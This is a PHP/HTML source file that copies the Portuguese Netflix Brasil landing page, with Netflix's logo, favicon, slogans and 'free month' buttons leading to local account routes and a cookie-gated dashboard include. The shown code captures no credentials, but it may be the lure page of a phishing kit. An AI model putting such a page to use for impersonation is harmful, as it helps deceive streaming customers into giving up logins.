<?php
if(empty($_COOKIE['iduser']) and (empty($_COOKIE['inisession']))){?>
<head>
<title>
Netflix Brasil
</title>
<meta charset="UTF-8">
<link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
</head>
<html>

<style>
*{
	margin: 0;
	padding: 0;
	font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;
	outline: none;
    list-style:none;
}

body{
    background: #000;
}

.header-al-home-a{
    width: 100%;
    height: 5vw;
    left: 0;
    top: 0;
    position: absolute;
    z-index: 1000;
}

.header-al-home-a svg{
		height: 3vw;
		margin-top: 1.1vw;
		margin-left: 3vw;
		opacity: .8;
		cursor: pointer;
	}

    .header-al-home-a svg:hover{
        opacity: 1;
	}

.body-oa-tod{
    position: relative;
    -webkit-transform: translate(0,-50%);
    -moz-transform: translate(0,-50%);
    -ms-transform: translate(0,-50%);
    -o-transform: translate(0,-50%);
    transform: translate(0,-50%);
    background-image: url(/static/back.jpg);
    width: 100%;
    height: 85vw;
    background-size: cover;
}

.eo{
    background-image: -webkit-gradient(linear,left top,right top,color-stop(20%,rgba(0,0,0,.8)),color-stop(85%,rgba(0,0,0,0)));
    background-image: -webkit-linear-gradient(left,rgba(0,0,0,.8) 20%,rgba(0,0,0,0) 85%);
    background-image: -moz-linear-gradient(left,rgba(0,0,0,.8) 20%,rgba(0,0,0,0) 85%);
    background-image: -o-linear-gradient(left,rgba(0,0,0,.8) 20%,rgba(0,0,0,0) 85%);
    background-image: linear-gradient(to right,rgba(0,0,0,.8) 20%,rgba(0,0,0,0) 85%);
    width: 80%;
    height: 100%;
}

.login-b{
    color: #fff;
    background-color: #e50914;
    line-height: normal;
    margin: 18px 3% 0;
    padding: 7px 17px;
    font-weight: 400;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
    font-size: 1vw;
    height: 2.2vw;
    width: 5vw;
    border: none;
    float: right;
    cursor: pointer;
}

.apresentation{
    position: absolute;
    color: #fff;
    bottom: 10vw;
    width: 50vw;
    height: 20vw;
    left: 2vw;
}

.apresentation h1{
    font-size: 4.5vw;
    padding: 0.9vw;
    text-shadow: 0.2vw 0.2vw #000;
}

.apresentation p{
    padding: 1.3vw;
    font-size: 1.5vw;
    font-weight: bold;
}

.apresentation .btn-free {
    color: #fff;
    font-size: 1.2vw;
    background-color: #e50914;
    background-image: -webkit-gradient(linear,left top,left bottom,from(#e50914),to(#db0510));
    background-image: -webkit-linear-gradient(top,#e50914,#db0510);
    background-image: -moz-linear-gradient(top,#e50914,#db0510);
    background-image: -o-linear-gradient(top,#e50914,#db0510);
    background-image: linear-gradient(to bottom,#e50914,#db0510);
    -webkit-box-shadow: 0 1px 0 rgba(0,0,0,.45);
    -moz-box-shadow: 0 1px 0 rgba(0,0,0,.45);
    box-shadow: 0 1px 0 rgba(0,0,0,.45);
    border: none;
    height: 3vw;
    width: 19vw;
    cursor: pointer;
}

</style>

<body>

<div class="header-al-home-a">
<a href="/">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 81.387"><g fill="#b81d24"><path d="M256.09 76.212c4.178.405 8.354.84 12.52 1.29l9.198-22.712 8.743 24.807c4.486.562 8.97 1.152 13.44 1.768l-15.328-43.501L299.996 0H287.01l-.135.186-8.283 20.455L271.32.003h-12.822l13.237 37.565-15.644 38.644zM246.393 75.322V0h-12.817v74.265c4.275.33 8.552.684 12.817 1.056M150.113 71.11c3.46 0 6.916.026 10.366.054V43.492h15.397V31.708H160.48v-19.91h17.733V0h-30.6v71.12c.831 0 1.666-.013 2.5-.01M110.319 71.83c4.27-.152 8.544-.28 12.824-.384V11.8h11.98V.003H98.339V11.8h11.982v60.03h-.002zM12.295 79.772V34.897L27.471 77.96c4.667-.524 9.341-1.017 14.028-1.483V.001H29.201v46.483L12.825.001H0v81.384h.077c4.063-.562 8.14-1.096 12.218-1.613M85.98 11.797V.001H55.377V75.202a1100.584 1100.584 0 0 1 30.578-2.211V61.184c-5.916.344-11.82.74-17.71 1.181V43.497h15.397V31.706H68.245V11.797H85.98zM203.614 60.62V-.003h-12.873v71.876c10.24.376 20.44.9 30.606 1.56V61.619c-5.9-.381-11.81-.712-17.733-1"/></g></svg>
</a><a href="account">
<button class="login-b">
Entrar
</button>
</a>
</div>

<div class="body-oa-tod">
<div class="eo">
</div>

<div class="apresentation">
<h1>Sua próxima história, agora.</h1>
<p>ASSISTA ONDE QUISER. CANCELE QUANDO QUISER.<p>
<a href="/account/1">
<button class="btn-free">ASSISTA UM MÊS GRÁTIS</button>
</a>
</div>

</div>

<style>
.baladinha{
    background-color: #141414;
    border-right: none;
    width: 100%;
    height: 11vw;
    position: relative;
    top: -43vw;
    border-bottom: 0.1vw solid #4c4545;
    padding-top: 0vw;
}


#icon-cancel{
    width: 4vw;
    height: 4vw;
    position: relative;
    top: 1vw;
    fill: #fff;
}

#icon-cross-device-screens-desktop{
    fill: #fff;
    width: 9vw;
    height: 4vw;
    top: 1vw !important;
    position: relative;
}

#icon-price-tag{
    fill: #fff;
    width: 8vw;
    height: 4vw;
}

.baladinha li{
    width: 20%;
    height: inherit;
    display: inline-block;
    left: 20%;
    position: relative;
    margin-left: 0.5vw;
    top: 0;
    height: 9vw;
    cursor: pointer;
    opacity: 0.6;
    padding-top: 1.8vw;
}

.baladinha li:hover{
    opacity: 1;
}

.baladinha p{
    color: #fff;
    position: relative;
    top: 2vw;
    font-weight: bold;
    font-size: 1.2vw;
}

.time{
    top: 1vw !important;
}

.ta{
    height: 7.65vw !important;
}

.ativo{
    border-bottom: 0.2vw solid red;
    opacity: 1 !important;
}

</style>

<div class="baladinha">

<li class="ativo">
<center>
<svg viewBox="0 0 40 48" style="fill:#fff;" id="icon-cancel"><path d="M29.55 18.7v-4.6c-5.2.4-4.6 2.8-4.6 2.8.3 1.7 2.35 2.35 2.35 2.35.6-.35 2.25-.55 2.25-.55zm3.7 1L33 21.3c-9.15-.3-8.7-3.75-8.7-3.75l.15 5.2c1.1 4.05 8.35 4.2 8.2 4.2l-.2 1.5 6.9-3.8-6.1-4.95zm-20.3 6.25c-.5-.5-1.3-.45-1.8.05-.45.5-.45 1.25.05 1.75s1.3.45 1.75-.05c.5-.5.5-1.25 0-1.75zm2.35-15.9L1.5 1.45V38.9l2.6 1.45 11.2 6.2v-36.5zM1.5 40.35C.4 39.85 0 39.7 0 38.9l1.5 1.45zM28.05 28.1h1.45v10.8c0 .8-.65 1.45-1.45 1.45H16.8v6.15c0 .849-.65 1.5-1.45 1.5L1.5 40.35 0 38.9V1.45C0 .65.65 0 1.5 0h26.55c.8 0 1.45.65 1.45 1.45v11.2h-1.45V1.45H4.1L15.6 8.6c.95.35 1.2.65 1.2 1.45V38.9h11.25V28.1z"></path></svg>
<p>Sem compromisso
Cancele online quando quiser</p>
</center>
</li>

<li>
<center>
<svg viewBox="0 0 145 48" id="icon-cross-device-screens-desktop">    <path d="M138.211 44.009c-.398 0-.697.349-.697.748 0 .398.3.698.697.698.4 0 .749-.3.749-.698 0-.4-.35-.748-.749-.748zm-4.19 2.593h8.682V28.191h-8.682v18.411zm-.05-19.807h8.732c.798 0 1.396.598 1.396 1.396v18.362c0 .798-.598 1.447-1.396 1.447h-8.732c-.749 0-1.397-.649-1.397-1.447V28.191c0-.798.648-1.396 1.397-1.396zM74.095 44.009h48.7V13.173h-48.7v30.836zm0-32.233h48.75c.748 0 1.396.648 1.396 1.446v30.787c0 .798-.648 1.396-1.397 1.396H74.095c-.797 0-1.396-.598-1.396-1.396V13.222c0-.798.599-1.446 1.396-1.446zm56.583 34.677v.649c0 .499-.799.898-1.747.898H67.66c-.998 0-1.746-.4-1.746-.898v-.649h64.764zm-111.567.898v-2.445c0-.798.648-1.446 1.396-1.446h29.688c.799 0 1.397.648 1.397 1.446v2.445h-1.397v-2.494H20.557v2.494H19.11zM1.397 41.065h68.208V1.397H1.397v39.668zM1.397 0h68.208c.799 0 1.447.599 1.447 1.397v39.668c0 .748-.648 1.396-1.447 1.396H1.397A1.394 1.394 0 0 1 0 41.065V1.397C0 .599.599 0 1.397 0z"></path></svg><p>Sem compromisso
Assista onde quiser, quanto quiser</p>
</center>
</li>

<li class="ta">
<center>
<svg viewBox="0 0 63 48" id="icon-price-tag"><g><path d="M35.752 7.65c-1.1 0-2.1.45-2.85 1.2a3.97 3.97 0 0 0 .1 5.651c.75.7 1.7 1.1 2.75 1.1a4.01 4.01 0 0 0 2.851-1.2c.75-.8 1.149-1.8 1.1-2.85 0-1.05-.451-2.05-1.201-2.8a4.072 4.072 0 0 0-2.75-1.1m-.002 9.15c-1.35 0-2.65-.5-3.6-1.45-2.05-1.95-2.101-5.25-.15-7.3 1-1.05 2.3-1.6 3.75-1.6 1.35 0 2.6.5 3.6 1.45.95.95 1.55 2.25 1.55 3.65.05 1.35-.5 2.65-1.45 3.65-.95 1.05-2.3 1.6-3.7 1.6m-2.148 9.701a.727.727 0 0 1-1.05 0l-5.3-5.05c-.3-.3-.3-.75 0-1.05.25-.3.75-.3 1.05-.05l5.25 5.1c.3.3.3.75.05 1.05m-5.95-10.05l-4.55.098v-1.799c0-.4-.35-.7-.75-.7-.401 0-.701.3-.701.7l.05 2.55c0 .3.2.55.45.65.101.05.15.05.25.05l5.301-.1c.4 0 .7-.3.7-.7 0-.4-.35-.75-.75-.75m.1 16.15a.723.723 0 0 1-1.05 0l-5.301-5.099c-.3-.25-.3-.75 0-1.05.25-.25.75-.3 1 0l5.301 5.1c.3.25.3.75.05 1.05m-5.951-10.05l-4.55.1v-1.8c-.05-.4-.35-.75-.75-.75-.4.05-.75.35-.7.75v2.55c.05.3.2.55.5.65.05.05.15.05.25.05l5.25-.1c.4 0 .75-.35.75-.75s-.35-.7-.75-.7m.25 15.95c-.299.3-.75.3-1.049 0l-5.301-5.1c-.3-.25-.3-.75 0-1.05.3-.25.75-.3 1.05 0l5.251 5.1c.299.25.35.75.049 1.05m-5.95-10.05l-4.5.1-.05-1.8c0-.4-.35-.75-.75-.75-.401.05-.7.35-.7.75l.049 2.55c0 .3.201.55.451.65.1.05.2.05.3.05l5.25-.1c.4 0 .7-.35.7-.75s-.35-.7-.75-.7M43.903 4.9c0-.5-.122-.876-.35-1.1-.279-.274-.65-.3-.85-.3H42.402c-.799.05-1.85.05-3.049.05-5.551 0-13.151-.35-13.851-.35-.15 0-.3.05-.45.2L1.4 27.952c-.1.15-.2.3-.2.5s.1.35.25.5l18.301 17.65c.25.25.751.25 1.001-.05l23.651-24.55c.153-.197.198-.488.2-.7M20.252 48.002a1.937 1.937 0 0 1-1.351-.55L.6 29.801c-.35-.349-.6-.799-.6-1.299 0-.55.2-1 .55-1.4L24.202 2.548c.3-.299.699-.5 1.15-.549h.15c.1 0 8.1.35 13.851.35 1.149 0 2.149 0 3-.05h.35c.7 0 1.3.2 1.75.65.45.45.65 1.1.65 1.95.05.85.705 14.126.65 16.551-.011.502-.15 1-.5 1.4L21.602 47.403c-.35.35-.85.6-1.35.6"></path>        <path d="M62.004 0c-2.95 6.4-12.651 6.4-12.651 6.4-7.05.1-10.951 2.25-12.751 3.601-.7-.351-1.55-.2-2.1.35-.7.7-.65 1.85.05 2.549.7.651 1.85.651 2.5-.049.55-.55.65-1.3.4-1.951 5.05-3.5 11.9-3.299 11.9-3.299C60.105 7.601 62.855.6 62.855.6l-.85-.6z"></path>    </g></svg>
<p class="time">Escolha seu plano</p>
</center>
</li>

</div>

<style>
.cancel{
    background: #000;
    width: 100%;
    position: absolute;
    height: 28vw;
    top: 53.5vw;
    display: block;
}

.onde{
    background: #000;
    width: 100%;
    position: absolute;
    height: 28vw;
    top: 53.5vw;
    display: none;
}
</style>


<div class="cancel">
<center>
<style>
.left{
    width: 35vw;
    float: left;
    left: 15vw;
    position: relative;
    top: 5vw;
    padding: 2vw;
}

.left span{
    font-size: 2vw;
}

.red-free{
    color: #fff;
    background-color: #e50914;
    background-image: -webkit-gradient(linear,left top,left bottom,from(#e50914),to(#db0510));
    background-image: -webkit-linear-gradient(top,#e50914,#db0510);
    background-image: -moz-linear-gradient(top,#e50914,#db0510);
    background-image: -o-linear-gradient(top,#e50914,#db0510);
    background-image: linear-gradient(to bottom,#e50914,#db0510);
    -webkit-box-shadow: 0 1px 0 rgba(0,0,0,.45);
    -moz-box-shadow: 0 1px 0 rgba(0,0,0,.45);
    box-shadow: 0 1px 0 rgba(0,0,0,.45);
    border: none;
    width: 15vw;
    height: 3vw;
    cursor: pointer;
    position: relative;
    top: 1vw;
    font-size: 1vw;
}
</style>
<div class="left">
<span style="color: #fff;">Se você decidir não continuar a assinatura, tudo bem Sem compromisso Cancel online quando quiser.</span>
<br><a href="/account/1"><button class="red-free">ASSISTA O MÊS GRÁTIS</button></a>
</div>
<img src="/static/cancel.png" style="width: 30vw; padding: 2vw;"/>
</center>
</div>

<div class="onde">
<div class="left">
<span style="color: #fff;">Se você decidir não continuar a assinatura, tudo bem Sem compromisso Cancel online quando quiser.</span>
<br><button class="red-free">ASSISTA O MÊS GRÁTIS</button>
</div>
<img src="/static/cancel.png" style="width: 30vw; padding: 2vw;position: relative; left: 10vw;"/>
</center>
</div>


</body>
<?php } else{
    include 'dashboard.php';
}
    ?>
</html>